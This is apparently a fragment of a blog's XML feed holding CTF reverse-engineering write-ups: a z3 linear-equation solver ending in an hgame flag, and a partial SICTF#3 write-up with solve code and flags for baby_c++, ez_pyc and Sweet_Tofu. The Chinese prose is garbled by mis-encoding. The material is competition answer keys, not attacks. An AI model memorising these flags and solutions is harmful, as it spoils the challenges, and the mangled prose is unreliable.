+  <span class="number">193</span> * v22 +  <span class="number">122</span> * (v6 + <span class="number">2</span> * v7) +  <span class="number">211</span> * (v10 + v25) +  <span class="number">21</span> * (v17 + <span class="number">7</span> * v41) +  <span class="number">11</span> * (v4 + <span class="number">23</span> * (v16 + v39) + <span class="number">2</span> * (v40 + <span class="number">5</span> * v30 + <span class="number">2</span> * (<span class="number">2</span> * v18 + v29) + <span class="number">2</span> * v18 + v29)) +  <span class="number">5</span> * (<span class="number">46</span> * v9 + <span class="number">26</span> * v20 + <span class="number">4</span> * (v31 + <span class="number">2</span> * v21) + v15 + <span class="number">27</span> * v2 + <span class="number">10</span> * v1) +  <span class="number">36</span> * (v3 + <span class="number">5</span> * v26) == <span class="number">376007</span>)</span><br><span class="line">    ,  (<span class="number">63</span> * v19 +  <span class="number">143</span> * v5 +  <span class="number">250</span> * v6 +  <span class="number">136</span> * v2 +  <span class="number">214</span> * v40 +  <span class="number">62</span> * v26 +  <span class="number">221</span> * v42 +  <span class="number">226</span> * v7 +  <span class="number">171</span> * v28 +  <span class="number">178</span> * v8 +  <span class="number">244</span> * v23 +  ((v9 &lt;&lt; <span class="number">7</span>)) +  <span class="number">150</span> * v31 +  <span class="number">109</span> * v29 +  <span class="number">70</span> * v41 +  <span class="number">127</span> * v20 +  <span class="number">204</span> * v39 +  <span class="number">121</span> * v22 +  <span class="number">173</span> * v18 +  <span class="number">69</span> * (v25 + v30 + v27) +  <span class="number">74</span> * (v16 + <span class="number">2</span> * v15 + v15) +  <span class="number">22</span> * (<span class="number">7</span> * v24 + v17 + <span class="number">10</span> * v11) +  <span class="number">40</span> * (v1 + <span class="number">4</span> * v21 + v21) +  <span class="number">81</span> * v10 +  <span class="number">94</span> * v4 +  <span class="number">84</span> * v3 == <span class="number">411252</span>)</span><br><span class="line">    ,  (<span class="number">229</span> * v15 +  <span class="number">121</span> * v4 +  <span class="number">28</span> * v30 +  <span class="number">206</span> * v16 +  <span class="number">145</span> * v27 +  <span class="number">41</span> * v1 +  <span class="number">247</span> * v6 +  <span class="number">118</span> * v26 +  <span class="number">241</span> * v28 +  <span class="number">79</span> * v8 +  <span class="number">102</span> * v25 +  <span class="number">124</span> * v23 +  <span class="number">65</span> * v9 +  <span class="number">68</span> * v31 +  <span class="number">239</span> * v17 +  <span class="number">148</span> * v24 +  <span class="number">245</span> * v39 +  <span class="number">115</span> * v11 +  <span class="number">163</span> * v22 +  <span class="number">137</span> * v18 +  <span class="number">53</span> * (v5 + <span class="number">2</span> * v29) +  <span class="number">126</span> * (v40 + <span class="number">2</span> * v10) +  <span class="number">38</span> * (v7 + v21 + <span class="number">4</span> * v7 + <span class="number">6</span> * v41) +  <span class="number">12</span> * (v2 + <span class="number">16</span> * v42) +  <span class="number">109</span> * v20 +  <span class="number">232</span> * v3 +  <span class="number">47</span> * v19 == <span class="number">435012</span>)</span><br><span class="line">    ,  (<span class="number">209</span> * v21 +  <span class="number">233</span> * v40 +  <span class="number">93</span> * v1 +  <span class="number">241</span> * v2 +  <span class="number">137</span> * v8 +  <span class="number">249</span> * v17 +  <span class="number">188</span> * v29 +  <span class="number">86</span> * v24 +  <span class="number">246</span> * v10 +  <span class="number">149</span> * v20 +  <span class="number">99</span> * v11 +  <span class="number">37</span> * v22 +  <span class="number">219</span> * v18 +  <span class="number">17</span> * (v6 + <span class="number">10</span> * v25) +  <span class="number">49</span> * (v5 + <span class="number">3</span> * v3 + <span class="number">4</span> * v28 + v28) +  <span class="number">5</span> * (<span class="number">16</span> * v39 + <span class="number">11</span> * (v41 + <span class="number">2</span> * v27 + v27) + <span class="number">12</span> * v7 + v31 + <span class="number">30</span> * v16 + <span class="number">27</span> * v19) +  <span class="number">18</span> * (v23 + <span class="number">2</span> * (v4 + v26 + <span class="number">2</span> * v4) + v4 + v26 + <span class="number">2</span> * v4) +  <span class="number">24</span> * v9 +  <span class="number">109</span> * v42 +  <span class="number">183</span> * v30 +  <span class="number">154</span> * v15 == <span class="number">392484</span>)</span><br><span class="line">    ,  (<span class="number">155</span> * v15 +  <span class="number">247</span> * v40 +  <span class="number">157</span> * v28 +  <span class="number">119</span> * v23 +  <span class="number">161</span> * v17 +  <span class="number">133</span> * v20 +  <span class="number">85</span> * v22 +  <span class="number">229</span> * (v7 + v24) +  <span class="number">123</span> * (<span class="number">2</span> * v31 + v42) +  <span class="number">21</span> * (v41 + <span class="number">12</span> * v30) +  <span class="number">55</span> * (v9 + v5 + v18 + <span class="number">2</span> * v5) +  <span class="number">15</span> * (v3 + <span class="number">16</span> * v10 + <span class="number">9</span> * v21) +  <span class="number">2</span>* (v2 +  <span class="number">115</span> * v29 +  <span class="number">111</span> * v16 +  <span class="number">26</span> * v6 +  <span class="number">88</span> * v8 +  <span class="number">73</span> * v39 +  <span class="number">71</span> * v11 +  <span class="number">28</span> * (v26 + <span class="number">2</span> * (v25 + <span class="number">2</span> * v1)) +  <span class="number">51</span> * v27 +  <span class="number">99</span> * v4 +  <span class="number">125</span> * v19) == <span class="number">437910</span>)</span><br><span class="line">    ,  (<span class="number">220</span> * v3 +  <span class="number">200</span> * v4 +  <span class="number">139</span> * v15 +  <span class="number">33</span> * v5 +  <span class="number">212</span> * v30 +  <span class="number">191</span> * v16 +  <span class="number">30</span> * v27 +  <span class="number">233</span> * v1 +  <span class="number">246</span> * v6 +  <span class="number">89</span> * v2 +  <span class="number">252</span> * v40 +  <span class="number">223</span> * v42 +  <span class="number">19</span> * v25 +  <span class="number">141</span> * v21 +  <span class="number">163</span> * v9 +  <span class="number">185</span> * v17 +  <span class="number">136</span> * v31 +  <span class="number">46</span> * v24 +  <span class="number">109</span> * v10 +  <span class="number">217</span> * v39 +  <span class="number">75</span> * v22 +  <span class="number">157</span> * v18 +  <span class="number">125</span> * (v11 + v19) +  <span class="number">104</span> * (v33 + v20) +  <span class="number">43</span> * (v28 + <span class="number">2</span> * v29 + v29) +  <span class="number">32</span> * (v8 + v7 + <span class="number">2</span> * v8 + <span class="number">2</span> * (v23 + v26)) == <span class="number">421905</span>)</span><br><span class="line">    ,  (<span class="number">211</span> * v24 +  <span class="number">63</span> * v15 +  <span class="number">176</span> * v5 +  <span class="number">169</span> * v16 +  <span class="number">129</span> * v27 +  <span class="number">146</span> * v40 +  <span class="number">111</span> * v26 +  <span class="number">68</span> * v42 +  <span class="number">39</span> * v25 +  <span class="number">188</span> * v23 +  <span class="number">130</span> * v9 +  ((v31 &lt;&lt; <span class="number">6</span>)) +  <span class="number">91</span> * v41 +  <span class="number">208</span> * v20 +  <span class="number">145</span> * v39 +  <span class="number">247</span> * v18 +  <span class="number">93</span> * (v22 + v17) +  <span class="number">71</span> * (v6 + <span class="number">2</span> * v11) +  <span class="number">103</span> * (v8 + <span class="number">2</span> * v30) +  <span class="number">6</span> * (v21 + <span class="number">10</span> * v28 + <span class="number">28</span> * v7 + <span class="number">9</span> * v29 + <span class="number">19</span> * v2 + <span class="number">24</span> * v1 + <span class="number">22</span> * v3) +  <span class="number">81</span> * v10 +  <span class="number">70</span> * v4 +  <span class="number">23</span> * v19 == <span class="number">356282</span>)</span><br><span class="line">    ,  (<span class="number">94</span> * v42 +  <span class="number">101</span> * v2 +  <span class="number">152</span> * v40 +  <span class="number">200</span> * v7 +  <span class="number">226</span> * v8 +  <span class="number">211</span> * v23 +  <span class="number">121</span> * v24 +  <span class="number">74</span> * v11 +  <span class="number">166</span> * v18 +  (((v6 + <span class="number">3</span> * v28) &lt;&lt; <span class="number">6</span>)) +  <span class="number">41</span> * (<span class="number">4</span> * v9 + v21) +  <span class="number">23</span> * (v39 + <span class="number">11</span> * v41) +  <span class="number">7</span> * (v20 + <span class="number">10</span> * v25 + <span class="number">2</span> * v12 + v12) +  <span class="number">3</span> * (<span class="number">78</span> * v30 + <span class="number">81</span> * v16 + <span class="number">55</span> * v27 + <span class="number">73</span> * v1 + <span class="number">4</span> * v26 + v15 + <span class="number">85</span> * v3 + <span class="number">65</span> * v19) +  <span class="number">62</span> * v22 +  <span class="number">88</span> * v5 +  <span class="number">110</span> * v4 == <span class="number">423091</span>)</span><br><span class="line">    ,  (<span class="number">133</span> * v22 +  <span class="number">175</span> * v15 +  <span class="number">181</span> * v30 +  <span class="number">199</span> * v16 +  <span class="number">123</span> * v27 +  <span class="number">242</span> * v1 +  <span class="number">75</span> * v6 +  <span class="number">69</span> * v2 +  <span class="number">153</span> * v40 +  <span class="number">33</span> * v26 +  <span class="number">100</span> * v42 +  <span class="number">229</span> * v7 +  <span class="number">177</span> * v8 +  <span class="number">134</span> * v31 +  <span class="number">179</span> * v29 +  <span class="number">129</span> * v41 +  <span class="number">14</span> * v10 +  <span class="number">247</span> * v24 +  <span class="number">228</span> * v20 +  <span class="number">92</span> * v11 +  <span class="number">86</span> * (v9 + v32) +  <span class="number">94</span> * (v23 + v21) +  <span class="number">37</span> * (v17 + <span class="number">4</span> * v3) +  <span class="number">79</span> * (v25 + <span class="number">2</span> * v28) +  <span class="number">72</span> * v5 +  <span class="number">93</span> * v39 +  <span class="number">152</span> * v4 +  <span class="number">214</span> * v19 == <span class="number">391869</span>)</span><br><span class="line">    ,  (<span class="number">211</span> * v24 +  <span class="number">213</span> * v18 +  <span class="number">197</span> * v40 +  <span class="number">159</span> * v25 +  <span class="number">117</span> * v21 +  <span class="number">119</span> * v9 +  <span class="number">98</span> * v17 +  <span class="number">218</span> * v41 +  <span class="number">106</span> * v39 +  <span class="number">69</span> * v11 +  <span class="number">43</span> * (v2 + v29 + <span class="number">2</span> * v2) +  <span class="number">116</span> * (v4 + v10 + v37) +  <span class="number">5</span> * (v42 + <span class="number">9</span> * v23 + <span class="number">35</span> * v20 + <span class="number">37</span> * v31) +  <span class="number">11</span> * (v16 + <span class="number">13</span> * v27 + <span class="number">5</span> * v5 + <span class="number">8</span> * v30) +  <span class="number">6</span> * (<span class="number">29</span> * v28 + <span class="number">25</span> * v8 + <span class="number">38</span> * v22 + v15 + <span class="number">13</span> * v1 + <span class="number">10</span> * v3) +  <span class="number">136</span> * v7 +  <span class="number">142</span> * v6 +  <span class="number">141</span> * v19 == <span class="number">376566</span>)</span><br><span class="line">    ,  (<span class="number">173</span> * v3 +  <span class="number">109</span> * v15 +  <span class="number">61</span> * v30 +  <span class="number">187</span> * v1 +  <span class="number">79</span> * v6 +  <span class="number">53</span> * v40 +  <span class="number">184</span> * v21 +  <span class="number">43</span> * v23 +  <span class="number">41</span> * v9 +  <span class="number">166</span> * v31 +  <span class="number">193</span> * v41 +  <span class="number">58</span> * v24 +  <span class="number">146</span> * v10 +  ((v20 &lt;&lt; <span class="number">6</span>)) +  <span class="number">89</span> * v39 +  <span class="number">121</span> * v11 +  <span class="number">5</span> * (v17 + <span class="number">23</span> * v8) +  <span class="number">7</span> * (<span class="number">29</span> * v18 + v29 + <span class="number">4</span> * v7) +  <span class="number">13</span> * (<span class="number">3</span> * v42 + v16 + <span class="number">7</span> * v26 + <span class="number">13</span> * v2) +  <span class="number">3</span> * (v4 + <span class="number">83</span> * v5 + <span class="number">51</span> * v27 + <span class="number">33</span> * v22 + <span class="number">8</span> * (v19 + <span class="number">4</span> * v28) + <span class="number">18</span> * v25) == <span class="number">300934</span>)</span><br><span class="line">    ,  (<span class="number">78</span> * v1 +  <span class="number">131</span> * v5 +  <span class="number">185</span> * v16 +  <span class="number">250</span> * v40 +  <span class="number">90</span> * v26 +  <span class="number">129</span> * v42 +  <span class="number">255</span> * v28 +  <span class="number">206</span> * v8 +  <span class="number">239</span> * v25 +  <span class="number">150</span> * v10 +  <span class="number">253</span> * v39 +  <span class="number">104</span> * v22 +  <span class="number">58</span> * (v2 + <span class="number">2</span> * v7) +  <span class="number">96</span> * (v15 + v31) +  <span class="number">117</span> * (v9 + <span class="number">2</span> * v4) +  <span class="number">27</span> * (v17 + <span class="number">8</span> * v18 + v18) +  <span class="number">19</span> * (v23 + <span class="number">3</span> * v21 + <span class="number">4</span> * v29 + v29) +  <span class="number">7</span> * (<span class="number">22</span> * v41 + <span class="number">3</span> * (v11 + <span class="number">11</span> * v24) + v3 + <span class="number">29</span> * v6 + <span class="number">14</span> * v27) +  <span class="number">109</span> * v20 +  <span class="number">102</span> * v30 +  <span class="number">100</span> * v19 == <span class="number">401351</span>)</span><br><span class="line">    ,  (<span class="number">233</span> * v19 +  <span class="number">71</span> * v5 +  <span class="number">209</span> * v27 +  <span class="number">82</span> * v6 +  <span class="number">58</span> * v26 +  <span class="number">53</span> * v25 +  <span class="number">113</span> * v23 +  <span class="number">206</span> * v31 +  <span class="number">39</span> * v41 +  <span class="number">163</span> * v20 +  <span class="number">222</span> * v11 +  <span class="number">191</span> * v18 +  <span class="number">123</span> * (v7 + v40) +  <span class="number">69</span> * (v9 + <span class="number">2</span> * v22 + v22) +  <span class="number">9</span> * (v3 + <span class="number">8</span> * v24 + <span class="number">7</span> * (<span class="number">3</span> * v1 + v28) + <span class="number">5</span> * v16 + <span class="number">19</span> * v30) +  <span class="number">4</span> * (v15 + <span class="number">26</span> * v17 + <span class="number">61</span> * v29 + <span class="number">43</span> * v42 + <span class="number">49</span> * v2 + <span class="number">32</span> * v4) +  <span class="number">10</span> * (<span class="number">7</span> * (v8 + v36) + v39 + <span class="number">12</span> * v10) == <span class="number">368427</span>)</span><br><span class="line">    ,  (<span class="number">139</span> * v30 +  <span class="number">53</span> * v5 +  <span class="number">158</span> * v16 +  <span class="number">225</span> * v1 +  <span class="number">119</span> * v6 +  <span class="number">67</span> * v2 +  <span class="number">213</span> * v40 +  <span class="number">188</span> * v28 +  <span class="number">152</span> * v8 +  <span class="number">187</span> * v21 +  <span class="number">129</span> * v23 +  <span class="number">54</span> * v9 +  <span class="number">125</span> * v17 +  <span class="number">170</span> * v24 +  <span class="number">184</span> * v11 +  <span class="number">226</span> * v22 +  <span class="number">253</span> * v18 +  <span class="number">26</span> * (v29 + v41) +  <span class="number">97</span> * (v4 + <span class="number">2</span> * v25) +  <span class="number">39</span> * (<span class="number">5</span> * v26 + v27) +  <span class="number">21</span> * (v39 + <span class="number">8</span> * v42) +  <span class="number">12</span> * (<span class="number">17</span> * v10 + v31 + <span class="number">15</span> * v7 + <span class="number">12</span> * v19) +  <span class="number">165</span> * v20 +  <span class="number">88</span> * v15 +  <span class="number">157</span> * v3 == <span class="number">403881</span>)</span><br><span class="line">    ,  (<span class="number">114</span> * v3 +  <span class="number">61</span> * v27 +  <span class="number">134</span> * v40 +  <span class="number">62</span> * v42 +  <span class="number">89</span> * v9 +  <span class="number">211</span> * v17 +  <span class="number">163</span> * v41 +  <span class="number">66</span> * v24 +  <span class="number">201</span> * (v7 + v18) +  <span class="number">47</span> * (<span class="number">5</span> * v16 + v22) +  <span class="number">74</span> * (v4 + v31) +  <span class="number">142</span> * (v2 + v28) +  <span class="number">35</span> * (v20 + <span class="number">6</span> * v26) +  <span class="number">39</span> * (v15 + <span class="number">6</span> * v30) +  <span class="number">27</span> * (v25 + <span class="number">9</span> * v23 + <span class="number">8</span> * v6) +  <span class="number">4</span> * (v21 + <span class="number">63</span> * v19 + <span class="number">2</span> * (v1 + <span class="number">12</span> * (v10 + v5) + <span class="number">8</span> * v11 + <span class="number">26</span> * v29)) +  <span class="number">10</span> * (v8 + <span class="number">4</span> * v39 + v39) == <span class="number">382979</span>)</span><br><span class="line">    ,  (<span class="number">122</span> * v25 +  <span class="number">225</span> * v21 +  <span class="number">52</span> * v23 +  <span class="number">253</span> * v9 +  <span class="number">197</span> * v17 +  <span class="number">187</span> * v31 +  <span class="number">181</span> * v29 +  <span class="number">183</span> * v41 +  <span class="number">47</span> * v20 +  <span class="number">229</span> * v39 +  <span class="number">88</span> * v22 +  <span class="number">127</span> * (v10 + v32) +  <span class="number">37</span> * (v7 + <span class="number">3</span> * v3) +  (((v11 + <span class="number">2</span> * v30 + v30) &lt;&lt; <span class="number">6</span>)) +  <span class="number">7</span> * (<span class="number">21</span> * v8 + v27 + <span class="number">18</span> * (v4 + v1 + v38)) +  <span class="number">6</span> * (<span class="number">23</span> * v24 + v26 + <span class="number">17</span> * v2 + <span class="number">39</span> * v6) +  <span class="number">10</span> * (v5 + <span class="number">11</span> * v28 + <span class="number">21</span> * v42) +  <span class="number">149</span> * v19 +  <span class="number">165</span> * v40 +  <span class="number">121</span> * v15 == <span class="number">435695</span>)</span><br><span class="line">    ,  (<span class="number">165</span> * v20 +  <span class="number">223</span> * v4 +  <span class="number">249</span> * v5 +  <span class="number">199</span> * v1 +  <span class="number">135</span> * v2 +  <span class="number">133</span> * v26 +  <span class="number">254</span> * v42 +  <span class="number">111</span> * v7 +  <span class="number">189</span> * v28 +  <span class="number">221</span> * v25 +  <span class="number">115</span> * v21 +  <span class="number">186</span> * v9 +  <span class="number">79</span> * v41 +  <span class="number">217</span> * v24 +  <span class="number">122</span> * v11 +  <span class="number">38</span> * v18 +  <span class="number">109</span> * (v34 + v29) +  <span class="number">14</span> * (v8 + <span class="number">17</span> * v40 + <span class="number">8</span> * (v6 + v38)) +  <span class="number">4</span> * (<span class="number">11</span> * (<span class="number">5</span> * v30 + v39) + <span class="number">6</span> * (v10 + <span class="number">2</span> * v22) + v27 + <span class="number">52</span> * v17 + <span class="number">50</span> * v23) +  <span class="number">229</span> * v15 +  <span class="number">86</span> * v3 +  <span class="number">234</span> * v19 == <span class="number">453748</span>)</span><br><span class="line">    ,  (<span class="number">181</span> * v25 +  <span class="number">94</span> * v42 +  <span class="number">125</span> * v1 +  <span class="number">226</span> * v26 +  <span class="number">155</span> * v7 +  <span class="number">95</span> * v21 +  <span class="number">212</span> * v17 +  <span class="number">91</span> * v31 +  <span class="number">194</span> * v29 +  <span class="number">98</span> * v24 +  <span class="number">166</span> * v11 +  <span class="number">120</span> * v22 +  <span class="number">59</span> * v18 +  <span class="number">32</span> * (v9 + v8) +  <span class="number">158</span> * (v6 + v5) +  <span class="number">101</span> * (v41 + v19) +  <span class="number">63</span> * (v4 + <span class="number">2</span> * v23) +  <span class="number">67</span> * (v28 + <span class="number">2</span> * v20) +  <span class="number">11</span> * (v39 + <span class="number">10</span> * v16 + <span class="number">11</span> * v10) +  <span class="number">39</span> * (v30 + <span class="number">4</span> * (v2 + v15)) +  <span class="number">233</span> * v40 +  <span class="number">56</span> * v27 +  <span class="number">225</span> * v3 == <span class="number">358321</span>)</span><br><span class="line">    ,  (<span class="number">229</span> * v21 +  <span class="number">135</span> * v4 +  <span class="number">197</span> * v15 +  <span class="number">118</span> * v5 +  <span class="number">143</span> * v16 +  <span class="number">134</span> * v6 +  <span class="number">204</span> * v40 +  <span class="number">173</span> * v26 +  <span class="number">81</span> * v7 +  <span class="number">60</span> * v28 +  <span class="number">58</span> * v8 +  <span class="number">179</span> * v23 +  <span class="number">142</span> * v9 +  <span class="number">178</span> * v17 +  <span class="number">230</span> * v31 +  <span class="number">148</span> * v29 +  <span class="number">224</span> * v41 +  <span class="number">194</span> * v24 +  <span class="number">223</span> * v10 +  <span class="number">87</span> * v20 +  <span class="number">200</span> * v39 +  <span class="number">233</span> * v11 +  <span class="number">49</span> * v22 +  <span class="number">127</span> * v35 +  <span class="number">31</span> * (<span class="number">4</span> * v27 + v18) +  <span class="number">42</span> * (v1 + <span class="number">6</span> * v2) +  <span class="number">109</span> * v42 +  <span class="number">75</span> * v3 +  <span class="number">165</span> * v19 == <span class="number">456073</span>)</span><br><span class="line">    ,  (<span class="number">41</span> * v4 +  <span class="number">253</span> * v3 +  <span class="number">163</span> * v15 +  <span class="number">193</span> * v30 +  <span class="number">155</span> * v16 +  <span class="number">113</span> * v27 +  <span class="number">131</span> * v6 +  <span class="number">55</span> * v2 +  <span class="number">21</span> * v40 +  <span class="number">53</span> * v26 +  <span class="number">13</span> * v8 +  <span class="number">201</span> * v25 +  <span class="number">237</span> * v9 +  <span class="number">223</span> * v31 +  <span class="number">95</span> * v24 +  <span class="number">194</span> * v20 +  <span class="number">62</span> * v39 +  <span class="number">119</span> * v11 +  <span class="number">171</span> * v22 +  <span class="number">135</span> * v18 +  <span class="number">69</span> * (v10 + <span class="number">3</span> * v28) +  <span class="number">211</span> * (v1 + v29) +  <span class="number">4</span> * (<span class="number">43</span> * v7 + v42 + <span class="number">40</span> * v17) +  <span class="number">6</span> * (v5 + <span class="number">33</span> * v41 + <span class="number">20</span> * (<span class="number">2</span> * v19 + v21) + <span class="number">24</span> * v23) == <span class="number">407135</span>)</span><br><span class="line">    ,  (<span class="number">111</span> * v19 +  <span class="number">190</span> * v3 +  <span class="number">149</span> * v4 +  <span class="number">173</span> * v28 +  <span class="number">118</span> * v23 +  <span class="number">146</span> * v29 +  <span class="number">179</span> * v10 +  <span class="number">51</span> * v20 +  <span class="number">49</span> * v39 +  <span class="number">61</span> * v11 +  <span class="number">125</span> * v22 +  <span class="number">162</span> * v18 +  <span class="number">214</span> * v35 +  <span class="number">14</span> * (v34 + v24) +  <span class="number">178</span> * (v41 + v16) +  <span class="number">11</span> * (<span class="number">4</span> * v9 + v21 + <span class="number">17</span> * v42) +  <span class="number">65</span> * (v26 + v17 + <span class="number">2</span> * v26 + <span class="number">2</span> * v5) +  <span class="number">4</span> * (v7 + <span class="number">38</span> * v15 + <span class="number">4</span> * v13 + v13 + <span class="number">8</span> * v40 + <span class="number">43</span> * v2) == <span class="number">369835</span>)</span><br><span class="line">    ,  (<span class="number">27</span> * v27 +  <span class="number">223</span> * v6 +  <span class="number">147</span> * v26 +  <span class="number">13</span> * v21 +  <span class="number">35</span> * (v17 + <span class="number">7</span> * v4) +  <span class="number">57</span> * (v19 + v32 + <span class="number">3</span> * v11) +  <span class="number">11</span> * (v1 + <span class="number">17</span> * (v9 + v5) + <span class="number">10</span> * v16 + <span class="number">3</span> * v31) +  <span class="number">2</span>* (<span class="number">53</span> * v23 +  v25 +  <span class="number">38</span> * v15 +  <span class="number">43</span> * v42 +  <span class="number">115</span> * v29 +  <span class="number">61</span> * v22 +  <span class="number">111</span> * (v10 + v40) +  <span class="number">14</span> * (v20 + v7 + <span class="number">2</span> * v7 + <span class="number">8</span> * v28) +  <span class="number">109</span> * v2 +  <span class="number">100</span> * v41 +  <span class="number">63</span> * v8) +  <span class="number">93</span> * v39 +  <span class="number">251</span> * v30 +  <span class="number">131</span> * v3 == <span class="number">393303</span>)</span><br><span class="line">    ,  (<span class="number">116</span> * v9 +  <span class="number">152</span> * v29 +  <span class="number">235</span> * v20 +  <span class="number">202</span> * v18 +  <span class="number">85</span> * (v8 + <span class="number">3</span> * v11) +  <span class="number">221</span> * (v16 + v40) +  <span class="number">125</span> * (v33 + v24) +  <span class="number">7</span> * (<span class="number">19</span> * v4 + <span class="number">9</span> * (v10 + <span class="number">2</span> * v25) + v2 + <span class="number">33</span> * v3 + <span class="number">32</span> * v19) +  <span class="number">3</span> * (<span class="number">71</span> * v39 + <span class="number">43</span> * v22 + <span class="number">32</span> * (v17 + v26) + <span class="number">15</span> * (v5 + v6 + <span class="number">2</span> * v23) + v28 + <span class="number">74</span> * v31 + <span class="number">48</span> * v42) +  <span class="number">10</span> * (v21 + <span class="number">11</span> * v30 + <span class="number">16</span> * v15) +  <span class="number">136</span> * v7 +  <span class="number">106</span> * v1 +  <span class="number">41</span> * v27 == <span class="number">403661</span>)</span><br><span class="line">    ,  (<span class="number">127</span> * v4 +  <span class="number">106</span> * v15 +  <span class="number">182</span> * v30 +  <span class="number">142</span> * v5 +  <span class="number">159</span> * v16 +  <span class="number">17</span> * v1 +  <span class="number">211</span> * v6 +  <span class="number">134</span> * v2 +  <span class="number">199</span> * v7 +  <span class="number">103</span> * v28 +  <span class="number">247</span> * v23 +  <span class="number">122</span> * v9 +  <span class="number">95</span> * v41 +  <span class="number">62</span> * v10 +  <span class="number">203</span> * v39 +  <span class="number">16</span> * v11 +  <span class="number">41</span> * (<span class="number">6</span> * v42 + v25) +  <span class="number">9</span> * (<span class="number">22</span> * v24 + v20 + <span class="number">27</span> * v31 + <span class="number">28</span> * v40) +  <span class="number">10</span> * (v8 + v22 + v36 + <span class="number">8</span> * v17 + <span class="number">2</span> * (v22 + v36 + <span class="number">8</span> * v17) + <span class="number">13</span> * v29) +  <span class="number">6</span> * (<span class="number">23</span> * v27 + v26) +  <span class="number">213</span> * v18 +  <span class="number">179</span> * v3 +  <span class="number">43</span> * v19 == <span class="number">418596</span>)))</span><br><span class="line">s.add(<span class="number">149</span> * v19 +  v1 +  <span class="number">133</span> * v22 +  <span class="number">207</span> * v41 +  <span class="number">182</span> * v26 +  <span class="number">234</span> * v7 +  <span class="number">199</span> * v8 +  <span class="number">168</span> * v21 +  <span class="number">58</span> * v10 +  <span class="number">108</span> * v20 +  <span class="number">142</span> * v18 +  <span class="number">156</span> * (v9 + v25) +  <span class="number">16</span> * (v29 + <span class="number">6</span> * v31) +  <span class="number">126</span> * (v17 + <span class="number">2</span> * v39) +  <span class="number">127</span> * (v4 + <span class="number">2</span> * v27 + v40) +  <span class="number">49</span> * (v30 + <span class="number">4</span> * v16) +  <span class="number">11</span> * (v5 + <span class="number">22</span> * v11) +  <span class="number">5</span> * (v15 + v42 + <span class="number">45</span> * v24 + <span class="number">50</span> * v28) +  <span class="number">109</span> * v2 +  <span class="number">124</span> * v6 +  <span class="number">123</span> * v3 == <span class="number">418697</span>)</span><br><span class="line">pcheck(s,a1)</span><br><span class="line"><span class="comment">#hgame&#123;SMC_4nd_s0lv1ng_equ4t1Ons&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SICTF#3 wpåŠå¤ç°</title>
      <link href="/posts/65f5db04.html"/>
      <url>/posts/65f5db04.html</url>
      
        <content type="html"><![CDATA[<p>åˆè¢«æš´æ‰“äº†QAQ</p><h2 id="RE">RE</h2><h3 id="baby-c">baby_c++</h3><p>åˆ¤æ–­çš„åœ°æ–¹æ‰¾æ•°ç»„å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">a = [<span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x49</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, <span class="number">0x7B</span>, <span class="number">0x34</span>, <span class="number">0x65</span>, <span class="number">0x34</span>, <span class="number">0x37</span>, <span class="number">0x34</span>, <span class="number">0x62</span>, <span class="number">0x38</span>, <span class="number">0x61</span>, <span class="number">0x2D</span>, <span class="number">0x39</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x36</span>, <span class="number">0x2D</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x62</span>, <span class="number">0x2D</span>, <span class="number">0x39</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x36</span>, <span class="number">0x2D</span>, <span class="number">0x64</span>, <span class="number">0x34</span>, <span class="number">0x66</span>, <span class="number">0x35</span>, <span class="number">0x65</span>, <span class="number">0x33</span>, <span class="number">0x37</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x35</span>, <span class="number">0x31</span>, <span class="number">0x66</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">pl(a)</span><br><span class="line"><span class="comment">#SICTF&#123;4e474b8a-9df6-454b-9ea6-d4f5e37cd51f&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ez-pyc">ez_pyc</h3><p>åˆ†æé€»è¾‘å¯çŸ¥ï¼Œæ˜¯æ±‚è§£ä¸€ä¸ªæ•°ç‹¬ï¼ŒåŒæ—¶åªè¦æ±‚å…¶ä¸­çš„ä¸€ä¸ªè§£</p><p>å°è¯•æ”¾åˆ°ç½‘ä¸Šç›´æ¥æ±‚è§£ï¼Œç›´æ¥å‡ºæ¥äº†</p><p><img src="https://s2.loli.net/2024/02/23/yepYRodIr564mOT.png" alt="image-20240223163033222"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2548656723194376198518245679931748649825721856943342156965374812</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/23/UEgNoFqBv1CbdZm.png" alt="image-20240223163250217"></p><blockquote><p>è¿™é‡Œæˆ‘æŠŠè¾“å…¥æ”¹æˆåè¿›åˆ¶äº†</p></blockquote><p>ä¹‹åæ›´æ–°ä¸€ä¸ªç¢°æ’md5çš„æ–¹æ³•</p><h3 id="Sweet-Tofu">Sweet_Tofu</h3><p>åŠ¨è°ƒç›´æ¥æ‰¾æ£€æŸ¥æ•°ç»„ï¼Œåˆ¤æ–­æ—¶è¦å¼‚æˆ–0x66</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 